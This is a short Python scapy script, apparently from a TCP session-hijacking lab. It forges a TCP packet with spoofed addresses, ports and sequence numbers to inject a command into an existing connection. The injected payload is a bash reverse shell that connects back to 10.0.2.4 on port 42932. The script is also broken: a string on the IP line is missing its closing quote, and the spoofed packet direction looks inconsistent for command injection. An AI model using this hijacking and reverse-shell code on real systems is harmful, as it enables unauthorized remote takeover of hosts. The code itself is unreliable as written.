#!/usr/bin/python
from scapy.all import*

ip = IP(src="10.0.2.5", dst="10.0.2.6)
tcp = TCP(sport=23, dport=47932, flags="AP", seq=3689420154, ack=1001476718)
data = "/bin/bash -i > /dev/tcp/10.0.2.4/42932 0<&1 2>&1"
pkt=ip/tcp/data
send(pkt, verbose=0)